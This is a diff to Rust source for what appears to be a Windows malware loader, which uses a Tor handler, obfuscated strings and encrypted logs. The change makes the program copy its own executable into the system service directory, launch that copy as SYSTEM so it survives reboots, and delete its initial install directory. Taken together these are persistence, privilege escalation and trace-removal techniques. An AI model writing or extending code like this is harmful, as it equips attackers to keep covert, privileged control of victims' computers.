@@ -9,9 +9,14 @@ use crate::network::tor::LoaderTorHandler;
 use crate::service::utils::SERVICE_TYPE;
 use crate::{ err, info, tag, warn };
 use anyhow::{ Context, Result };
-use loader_vars::constants::{ loader_service_name, system_log_directory };
+use loader_vars::constants::{ loader_service_name, system_log_directory, system_service_directory };
 use obfstr::obfstr as s;
-use shared::constants::logs_encryption_key;
+use shared::constants::{
+    get_initial_install_dir,
+    get_loader_install_lock_dir,
+    logs_encryption_key,
+    system_loader_exe_name,
+};
 use shared::network::tor::LoggerConfig;
 use shared::utils::config::load_mib_config;
 use shared::utils::functions::{
@@ -19,6 +24,7 @@ use shared::utils::functions::{
     is_running_from_system32,
     try_spawn_program_as_system,
 };
+use std::fs::{ create_dir_all, remove_dir, remove_dir_all };
 use std::{ ffi::OsString, thread, time::Duration };
 use windows_service::{
     define_windows_service,
@@ -94,7 +100,9 @@ fn service_runner() -> Result<()> {
     }
 
     if mib_config.clean_up_done && !is_running_from_system32 {
-        post_cleanup();
+        if let Err(error) = post_cleanup() {
+            err!("Post cleanup error: ", error);
+        }
     }
 
     if mib_config.clean_up_done && is_running_from_system32 {
@@ -141,11 +149,32 @@ fn launch_cleanup() {
     }
 }
 
-fn post_cleanup() {
-    // reinstall itself as system service
+fn post_cleanup() -> Result<()> {
+    tag!("POST-CLEANUP");
+
+    let system_exe = system_service_directory().join(system_loader_exe_name());
+    std::fs::copy(get_current_exe(), &system_exe)?;
+
+    // then we just run it, and exit - if it fails we auto restart next boot
+    try_spawn_program_as_system(system_exe.to_str().unwrap(), None)?;
+
+    Ok(())
 }
 
 fn system_service_work() {
+    let initial_install_dir = get_initial_install_dir();
+    if initial_install_dir.exists() && initial_install_dir.is_dir() {
+        if let Err(error) = remove_dir_all(initial_install_dir) {
+            err!("remove_dir_all on initial_install_dir Error: ", error);
+        }
+    }
+    let loader_install_lock_dir = get_loader_install_lock_dir();
+    if !loader_install_lock_dir.exists() || !loader_install_lock_dir.is_dir() {
+        if let Err(error) = create_dir_all(loader_install_lock_dir) {
+            err!("create_dir_all on loader_install_lock_dir Error: ", error);
+        }
+    }
+
     tokio::runtime::Builder
         ::new_multi_thread()
         .enable_all()
